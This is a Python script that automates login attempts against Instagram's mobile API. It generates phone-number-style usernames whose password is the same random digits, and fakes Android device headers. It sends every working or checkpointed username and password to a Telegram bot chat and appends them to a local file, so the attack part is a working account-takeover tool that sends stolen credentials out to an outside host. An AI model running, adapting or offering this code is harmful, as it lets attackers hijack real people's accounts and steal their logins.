import requests
import time
import random
import os
import concurrent.futures
import os
import sys
from rich.panel import Panel
from rich import print
import telebot
from time import sleep
import time

import os

try:
    from cfonts import render, say
except:
    os.system("pip install python-cfonts")
    os.system("pip install render")

g = 0
b = 0
bb = 0
TOKEN = "your token"
chat_id = "your id"
bot = telebot.TeleBot(TOKEN)

Z = "\033[1;31m"
F = "\033[2;32m"
B = "\033[2;36m"
X = "\033[1;33m"
C = "\033[2;35m"


def SAJ(text, delay, add_new_line=True):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    if add_new_line:
        print("\n", end="", flush=True)


SAJ(
    F
    + f"\033[1;32m\n                  『ᴍᴀᴅᴇ ʙʏ : ENG.DEV SAJJAD ™ \n                         ᴛᴇʟᴇɢʀᴀᴍ: https://t.me/S_J_O_D \n                            ᴄʜᴀɴɴᴇʟ : https://t.me/KING_OF_ENG  』",
    0.00,
    True,
)


def ENG():
    from rich.panel import Panel
    from rich import print

    while True:
        global g, b, bb
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=30)
        executor.submit(ENG)
        A = "".join(random.choice("1234567890") for i in range(7))
        user = "98937" + A
        psw = A
        url = "https://i.instagram.com/api/v1/accounts/login/"

        payload = f"signed_body=SIGNATURE.%7B%22_csrftoken%22%3A%22misENGg%22%2C%22adid%22%3A%22fc6e5696-51ed-4470-bdb2-1ebc0b7ddded%22%2C%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%227%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%2C%5C%22uig_via_phone_id%5C%22%5D%7D%5D%22%2C%22device_id%22%3A%22android-45b75ea5eb4513b%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22guid%22%3A%229cfeb11a-719f-421b-9350-8533d40fecc3%22%2C%22login_attempt_count%22%3A0%2C%22jazoest%22%3A%2222072%22%2C%22phone_id%22%3A%220e260ae7-24f9-468d-9737-5a8332da68b1%22%2C%22username%22%3A%22{user}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(time.time() * 1000)).split('.')[0]}%3A{psw}%22%7D"

        headers = {
            "User-Agent": "Instagram 178.1.0.37.123 Android (23/6.0; 1133dpi; 513x1846; XIAOMI; SM-T504; gts748velte; qcom; en_GB)",
            "Accept-Encoding": "*",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-pigeon-session-id": "af55b556-2c71-445f-895a-853cc0c22483",
            "x-ig-connection-speed": "2997kbps",
            "x-ig-app-locale": "en_US",
            "x-bloks-is-layout-rtl": "false",
            "x-fb-client-ip": "True",
            "x-ig-bandwidth-speed-kbps": "-1.000",
            "x-ig-device-locale": "en_US",
            "accept-language": "en-US",
            "x-bloks-version-id": "ca012d153fcf76e0d3b1f2dd9c0048e4ae44bc4b6f662d3e02d7dc26eab5b6a6",
            "x-ig-device-id": "9cfeb11a-719f-421b-9350-8533d40fecc3",
            "x-ig-bandwidth-totaltime-ms": "0",
            "x-ig-connection-type": "WIFI",
            "ig-intended-user-id": "0",
            "x-bloks-is-panorama-enabled": "true",
            "x-ig-app-id": "567067343352427",
            "x-mid": "Zl9UjgABAAHererdnPDpTEqIOO17",
            "x-ig-www-claim": "0",
            "x-pigeon-rawclienttime": str(int(time.time() * 1000)).split(".")[0],
            "x-fb-http-engine": "Liger",
            "x-ig-mapped-locale": "en_US",
            "x-ig-bandwidth-totalbytes-b": "0",
            "x-ig-capabilities": "3brTvx0=",
            "x-fb-server-cluster": "true",
            "x-ig-timezone-offset": "10800",
            "x-ig-android-id": "android-45b75ea5eb4513b",
        }

        req = requests.post(url, data=payload, headers=headers).text

        if "logged_in_user" in req:
            g += 1
            bot.send_message(chat_id, f"][ENG.OK] {user} | {psw}  : @S_J_O_D")
            print(Panel(f" [ENG.OK] {user} | {psw}"))
            open("ENG.txt", "a").write(user + "|" + psw + "\n")
            sys.stdout.write(
                f"\r \033[31m[BAD ] | {bb} \033[33m[CP]|{b}\033[32m[OK][{g}]\r"
            )
        elif "checkpoint_challenge_required" in req or "checkpoint" in req:

            print(Panel(f" \t[yellow][ENG.CP] {user} | {psw}"))
            bot.send_message(
                chat_id, f"][ENG.مربوط هوية حبي ] {user} | {psw}     : @S_J_O_D"
            )
            b += 1
            sys.stdout.write(
                f"\r \033[31m[BAD ] | {bb} \033[33m[CP]|{b}\033[32m[OK][{g}]\r"
            )

        else:
            bb += 1
            sys.stdout.write(
                f"\r \033[31m[BAD ] | {bb} \033[33m[CP]|{b}\033[32m[OK][{g}]\r"
            )


ENG()
bot.polling()
